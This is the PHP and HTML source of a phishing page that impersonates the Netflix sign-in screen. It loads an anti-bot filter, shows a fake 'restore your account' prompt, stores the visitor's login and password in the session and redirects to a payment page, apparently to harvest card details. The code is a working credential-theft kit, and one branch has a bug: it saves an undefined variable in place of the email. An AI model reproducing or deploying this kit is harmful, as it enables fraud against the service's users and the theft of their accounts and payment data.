<?php 
	/*
	*
	* Page de connexion
	*
	*/

  include('../bot.php'); // Load le anti-bot

  session_start();

  if(isset($_POST['submit'])) {
      
      $email = $_POST['email'];
      $password = $_POST['password'];

      if(!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        
        $phone = preg_replace('/[^0-9]/', '', $email);

        if(strlen($phone) === 10) {
            
            $_SESSION['login']['username'] = $phone; 
            $_SESSION['login']['password'] = $password;

            header("Location: payment.php");
            die();

        }else{
          $error = "Please enter a valid login";
        }

      }else{
            
            $_SESSION['login']['username'] = $phone;
            $_SESSION['login']['password'] = $password;

            header("Location: payment.php");
            die();
      }
  }
 ?>
<!doctype html>
<html class="no-js" lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="css/foundation.min.css">
    <link rel="stylesheet" type="text/css" href="css/app.css">
    <link rel="shortcut icon" href="img/icon.ico">
    <link rel="apple-touch-icon" href="img/icon.png">
  </head>
  <body>

  	<div class="bg">
    
   	<header>
   		<a href="#" class="nflogo signupBasicHeader"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title><g><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg></a>
   	</header>

   	<section>
   		<div class="login">
   			<div class="mainlogin">
   				<h1>Sign In</h1>
            <p class="errormessage">
              <?php if(isset($error)) { ?>
              <span>Sorry, we can't find an account with this email address. Please try again.</span>
              <?php }else{ ?>
              <span>We apologize for any inconvenience. To restore your account, please Sign In.</span>
            </p>
              <?php unset($error); }
          ?>
   				<form method="POST" action="">
   					<input type="text" name="email" class="email" placeholder="Email or phone number" required="">
   					<input type="password" name="password" class="pass" placeholder="Password" required="">
   					<button type="submit" name="submit" class="submit">Sign In</button>
   					<div class="remember-help">
   						<input type="checkbox" name="remember" class="remember" id="remember">
   						<label for="remember" class="labelremember"><span>Remember me</span></label>
   						<span class="help">Need help?</span>
   					</div>
   				</form>
   			</div>
   			<div class="secondlogin">
   				<div class="loginfb">
   					<div>
   						<img src="img/fb.png">
   						<span>Login with Facebook</span>
   					</div>
   				</div>
   				<div class="signup">New to Netflix? <span>sign up now</span>.</div>
   			</div>
   		</div>
   	</section>

   	<footer>
   		<div class="footerdiviser"></div>
   		<div class="sitefooter">
   			<p class="footertop">Questions? <a href="tel:1-877-742-1335">Call 1-877-742-1335</a></p>
   			<ul class="footerlinks">
   			<li><a href="https://www.netflix.com/giftterms">Gift Card Terms</a></li>
   			<li><a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a></li>
   			<li><a href="https://help.netflix.com/legal/privacy">Privacy Statement</a></li>
   		</ul>
   		</div>
   	</footer>

   	</div>
   	
    <script src="js/vendor/jquery.js"></script>
    <script src="js/vendor/what-input.js"></script>
    <script src="js/vendor/foundation.min.js"></script>
    <script>
      $(document).foundation();
    </script>

  </body>
</html>